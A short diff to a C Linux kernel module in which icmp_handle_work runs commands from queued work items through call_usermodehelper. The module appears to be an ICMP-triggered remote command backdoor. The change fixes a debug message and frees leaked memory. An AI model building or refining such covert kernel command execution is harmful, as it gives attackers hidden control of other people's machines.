@@ -70,11 +70,13 @@ static void icmp_handle_work(struct work_struct *work) {
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     #ifdef DEBUG_K
     if (ret != 0){
-        pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
+        pr_err("Error (%d) executing command: \"%s\"\n", ret, work_item->command);
     }
     #endif
 
     atomic_dec(&work_count);
+    kfree(work_item->command);
+    kfree(work_item);
 }
 
 static int queue_execute(command_t type, char *argument){
